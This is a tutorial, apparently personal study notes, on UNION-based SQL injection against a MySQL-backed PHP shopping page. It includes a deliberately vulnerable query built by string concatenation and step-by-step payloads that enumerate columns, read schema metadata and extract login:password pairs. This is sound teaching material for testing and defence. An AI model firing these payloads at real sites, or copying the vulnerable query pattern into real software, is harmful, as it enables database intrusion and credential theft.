# SQL Injection

### Syntax

* For example, let see what the request:

  ```mysql
  SELECT column1, column2, column3 FROM table1 WHERE column4='user'  AND column5=3 AND column6=4;
  ```

  will retrieve from the following table:

  | column1 | column2 | column3 | column4 | column5 | column6 |
  | ------- | ------- | ------- | ------- | ------- | ------- |
  | 1       | test    | Paul    | user    | 3       | 13      |
  | 2       | test1   | Robert  | user    | 3       | 4       |
  | 3       | test33  | Super   | user    | 3       | 4       |

  Using the previous query, the following results will be retrieved:

  | column1 | column2 | column3 |
  | ------- | ------- | ------- |
  | 2       | test1   | Robert  |
  | 3       | test33  | Super   |

  As we can see, only these values are returned since they are the only ones matching all of the conditions in the `WHERE` statement.

  If you read source code dealing with some databases, you will often see `SELECT * FROM tablename`. The `*` is a **wildcard** requesting the database to return all columns and avoid the need to name them all.

### Usage in web app

Let's take the example of a shopping website, when accessing the URL  /cat.php?id=1, you will see the picture article1. The following table  shows what you will see for different values of id:

| URL               | Article displayed |
| ----------------- | ----------------- |
| /article.php?id=1 | Article 1         |
| /article.php?id=2 | Article 2         |
| /article.php?id=3 | Article 3         |

The PHP code behind this page is:

```php
<?php
$id = $_GET["id"];
$result= mysql_query("SELECT * FROM articles WHERE id=".$id);
$row = mysql_fetch_assoc($result);
// ... display of an article from the query result ...
?>
```

### Union Keyword

* The UNION statement is used to put together information from two requests:

  ```mysql
  SELECT * FROM articles WHERE id=3 UNION SELECT ...
  ```

* ```mysql
  SELECT id,name,price FROM articles WHERE id=3  
  UNION SELECT id,login,password  FROM users
  ```

  The most important rule, is that **both statements should return the  same number of columns** otherwise the database will trigger an error.

### Exploiting using Union

* Exploiting SQL injection using `UNION` follows the steps below:
  1. Find the number of columns to perform the UNION
  2. Find what columns are echoed in the page
  3. Retrieve information from the database meta-tables
  4. Retrieve information from other tables/databases

##### Finding no. of columns returned

* There are two methods to get this information:

  - using UNION SELECT and increase the number of columns;
  - using ORDER BY statement.

* Example 1:

  1. `SELECT id,name,price FROM articles where id=1 UNION SELECT 1`, the injection `1 UNION SELECT 1` will return an error since the number of columns are different in the two sub-parts of the query;

  2. `SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2`, for the same reason as above, the payload `1 UNION SELECT 1,2` will return an error;

  3. `SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3`, since both sub-parts have the same number of columns, this query won't  throw an error. You may even be able to see one of the numbers in the  page or in the source code of the page.

* **NOTE:** this works for MySQL the methodology is different for other  databases, the values 1,2,3,... should be changed to null,null,null, ... for database that need the same type of value in the 2 sides of the  UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to be used, the table dual can be used to complete the request: `UNION SELECT null,null,null FROM dual`

* Example 2:

  `ORDER BY` is mostly used to tell the database what column should be used to sort results:

  ```mysql
  SELECT firstname,lastname,age,groups FROM users ORDER BY firstname
  ```

  The request above will return the users sorted by the firstname column.

  ```mysql
  SELECT firstname,lastname,age,groups FROM users ORDER BY 3
  ```

  The request above will return the users sorted by the third column in the given query that is `age` 

  1. `SELECT id,name,price FROM articles where id=1 ORDER BY 5`, the injection `1 ORDER BY 5` will return an error since the number of columns is less than 5 in the first part of the query.
  2. `SELECT id,name,price FROM articles where id=1 ORDER BY 3`, the injection `1 ORDER BY 3` will not return an error since the number of columns is less than or equal of 3 in the first part of the query.
  3. `SELECT id,name,price FROM articles where id=1 ORDER BY 4`, the injection `1 ORDER BY 4` will return an error since the number of columns is less than 4 in the first part of the query.

##### To get current information

* ```mysql
  1 UNION SELECT 1,@@version,3,4
  ```

* ```mysql
  1 UNION SELECT 1,current_user(),3,4
  ```

* ```mysql
  1 UNION SELECT 1,database(),3,4
  ```

##### Retrieving information

- the list of all tables: 

  ```mysql
  SELECT table_name FROM information_schema.tables
  ```

  mixing this with previous query,

  ```mysql
  1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables
  ```

- the list of all columns: 

  ```mysql
  SELECT column_name FROM information_schema.columns
  ```

  mixing this with previous query,

  ```mysql
  1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns
  ```

- put table*name and column*name in different parts of the injection:

  ```mysql
  1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns
  ```

- concatenate table*name and column*name in the same part of the injection using the keyword CONCAT:

  ```mysql
  1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns
  ```

* EXAMPLE:

  ```mysql
  1 UNION SELECT 1,CONCAT(login,':',password),3,4 FROM users
  ```

  for getting details of column **login** and column **password** from the table of name **users** .